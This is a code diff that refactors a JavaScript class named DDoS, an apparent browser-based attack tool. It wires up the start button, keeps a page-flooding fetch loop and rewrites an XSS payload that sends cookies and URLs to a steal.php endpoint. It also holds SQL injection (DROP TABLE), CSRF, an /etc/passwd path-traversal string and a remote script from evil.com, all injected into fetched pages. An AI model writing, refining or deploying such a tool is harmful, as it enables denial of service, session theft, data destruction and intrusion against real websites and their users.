@@ -15,7 +15,9 @@ class DDoS {
   document.body.appendChild(this.container);
 
   this.attackTypeSelect.addEventListener('change', () => this.toggleCustomCodeArea());
+  this.startButton.addEventListener('click', () => this.start());
 
+  // Consider removing or making configurable for ethical reasons
   this.scriptInjection = `
    setInterval(() => {
     fetch(window.location.href, {
@@ -117,7 +119,7 @@ class DDoS {
   startButton.style.transition = 'background-color 0.3s ease';
   startButton.addEventListener('mouseover', () => startButton.style.backgroundColor = '#b71c1c');
   startButton.addEventListener('mouseout', () => startButton.style.backgroundColor = '#e53935');
-  startButton.addEventListener('click', () => this.start());
+  // Removed click listener - added in constructor for clarity and to ensure 'this' context
   return startButton;
  }
 
@@ -245,12 +247,20 @@ class DDoS {
    }
    const content = await response.text();
 
+   //Refactored XSS Payload for clarity
    const xssPayload = `<script>
     (function(){
-     var i=(new Image).src='http://example.com/steal.php?c='+document.cookie;
-     setTimeout(function(){document.body.appendChild(document.createElement('iframe')).src='http://example.com/steal.php?l='+location.href;}, 2000);
+     var img = new Image();
+     img.src = 'http://example.com/steal.php?c='+document.cookie;
+     setTimeout(function(){
+      var iframe = document.createElement('iframe');
+      iframe.src = 'http://example.com/steal.php?l='+location.href;
+      document.body.appendChild(iframe);
+     }, 2000);
     })();
     </script>`;
+
+   //Refactored payloads for clarity
    const sqliPayload = "'; DROP TABLE users; --";
    const csrfPayload = `<script>
     fetch('${target}', {
@@ -266,6 +276,7 @@ class DDoS {
    const lfiPayload = `../../../../etc/passwd`;
    const rfiPayload = `<script src="http://evil.com/malicious.js"></script>`;
 
+   //Refactored Injections
    let injectedContent = content.replace('</body>', `${xssPayload}${csrfPayload}${rfiPayload}</body>`);
    injectedContent = injectedContent.replace('<form>', `<input type="hidden" name="injection" value="${sqliPayload}"> <form>`);
    injectedContent = injectedContent.replace('<img>', `<img src="${lfiPayload}">`);
